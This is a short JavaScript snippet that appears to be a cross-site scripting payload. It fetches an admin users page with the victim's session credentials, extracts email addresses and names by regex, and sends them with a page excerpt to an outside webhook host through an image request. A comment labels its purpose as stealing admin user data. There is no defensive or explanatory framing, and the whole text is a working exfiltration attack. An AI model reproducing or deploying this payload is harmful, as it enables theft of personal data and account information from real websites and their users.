(function(){
  // Steal admin users list + sensitive data
  fetch('/admin/security/users', {credentials:'include'})
    .then(function(r){ return r.text(); })
    .then(function(html){
      // Extract emails using regex
      var emails = html.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}/g) || [];
      var names  = html.match(/(?<=<td[^>]*>)\s*[A-Z][a-z]+ [A-Z][a-z]+/g) || [];
      var data   = {emails: emails, names: names, snippet: html.substring(0,500)};
      new Image().src='https://webhooksite.net/586b992b-be17-4fee-beba-6190872e31b9/?r='+encodeURIComponent(JSON.stringify(data));
    });
})();
